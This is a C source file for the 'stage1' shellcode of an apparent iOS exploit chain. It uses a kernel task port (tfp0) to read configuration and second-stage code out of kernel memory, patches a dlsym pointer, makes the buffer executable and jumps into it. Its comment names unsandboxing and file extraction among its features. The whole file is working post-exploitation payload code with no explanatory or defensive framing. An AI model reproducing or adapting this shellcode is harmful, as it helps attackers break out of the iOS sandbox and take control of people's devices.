// xcrun --sdk iphoneos clang -arch arm64 -fPIC -O2 -Xlinker -sectalign -Xlinker __TEXT -Xlinker __text -Xlinker 0x4000 -Xlinker -sectalign -Xlinker __TEXT -Xlinker __cstring -Xlinker 0x4  -fomit-frame-pointer stage1_min.c

/* minimal stage1, under 1k, rx, no data segment
 * 
 * features:
 *  * process continuation
 *  * unsandboxing
 *  * I/O
 *  * file extraction
 */

/***** shellcode stuff *****/

#include <dlfcn.h>
#include <stdint.h>

// linked for us by our loader:
#define FSYM(name) \
  typeof(name)* _##name __attribute__ ((section("__TEXT,__text"))) = (void*)(0x4141414141414141);

#define DSYM(name) \
  uint64_t name __attribute__ ((section("__TEXT,__text"))) = 0x4242424242424242;

// only need one symbol linked for us, dlsym
// can just memgrep and replace the 0x4141.. with it's address
FSYM(dlsym);

// kdata is the address of a kernel buffer we'll use to retrieve initial configuration info
// then use for I/O
DSYM(kdata);

// all function calls should go via this macro
// so rather than doing this:
//  printf("%s %d hello\n", foo, 123);
// do this:
//  F(printf, "%s %d hello\n", foo, 123);
#define F(name, ...) \
   ((typeof(name)*)(_dlsym(RTLD_DEFAULT, #name)))(__VA_ARGS__)

/***** end shellcode stuff *****/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_traps.h>
#include <pthread.h>
#include <asl.h>
#include <string.h>

kern_return_t mach_vm_read
(
        vm_map_t target_task,
        mach_vm_address_t address,
        mach_vm_size_t size,
        vm_offset_t *data,
        mach_msg_type_number_t *dataCnt
);

kern_return_t mach_vm_read_overwrite
(
        vm_map_t target_task,
        mach_vm_address_t address,
        mach_vm_size_t size,
        mach_vm_address_t data,
        mach_vm_size_t *outsize
);

kern_return_t mach_vm_write
(
        vm_map_t target_task,
        mach_vm_address_t address,
        vm_offset_t data,
        mach_msg_type_number_t dataCnt
);

kern_return_t mach_vm_protect
(
        vm_map_t target_task,
        mach_vm_address_t address,
        mach_vm_size_t size,
        boolean_t set_maximum,
        vm_prot_t new_protection
);

kern_return_t mach_vm_allocate
(
        vm_map_t target,
        mach_vm_address_t *address,
        mach_vm_size_t size,
        int flags
);

extern int sigreturn(void* context, int infostyle, void* token);

struct kconf {
  uint64_t kaslr_slide;
  uint32_t kbuf_size;
  uint32_t n_text_fragments;
  uint64_t text_fragments[100]; // upper limit
};

// first function in the file will be the first instructions run by stage1:
void start(mach_port_t tfp0, void* sigreturn_context, void* sigreturn_token) {
    F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "hello from stage1!");

    // read kconf from data:
    struct kconf kc;
    mach_vm_size_t out_size;
    F(mach_vm_read_overwrite, tfp0, kdata, sizeof(struct kconf), (mach_vm_address_t)(&kc), (mach_vm_size_t*)(&out_size));
    
    F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "stage1 read kconf");
    
    // compute the total size of stage2:
    uint32_t total_size = kc.n_text_fragments*1024; // each text fragment is padded to 1024 bytes

    // roundup:
    total_size += 0x3fff;
    total_size &= (~0x3fff);

    // allocate a buffer for stage2:
    mach_vm_address_t base;
    mach_port_t self = F(task_self_trap);
    F(mach_vm_allocate, self, &base, total_size, VM_FLAGS_ANYWHERE);

    // read each fragment into the right place
    for (uint32_t i = 0; i < kc.n_text_fragments; i++) {
        F(mach_vm_read_overwrite, tfp0, kc.text_fragments[i], 1024, base+(i*1024), &out_size);
    }

    // link _dlsym:
    uint64_t needle = 0x4141414141414141;
    volatile uint64_t* stage2_dlsym_addr = F(memmem, base, total_size, &needle, 8);
    F(asl_log, NULL, NULL, ASL_LEVEL_ERR, "stage2_dlsym_addr: %016llx", stage2_dlsym_addr);
    *stage2_dlsym_addr = _dlsym;

    // set the protection:
    F(mach_vm_protect, self, base, total_size, 0, VM_PROT_READ | VM_PROT_EXECUTE);

    // jump to stage2:
    void (*stage2)(mach_port_t, void*) = base;
    stage2(tfp0, kdata);
}


// not the actual entrypoint, just to please the compiler...
int main() {
    start(0, 0, 0);
    return 42;
}
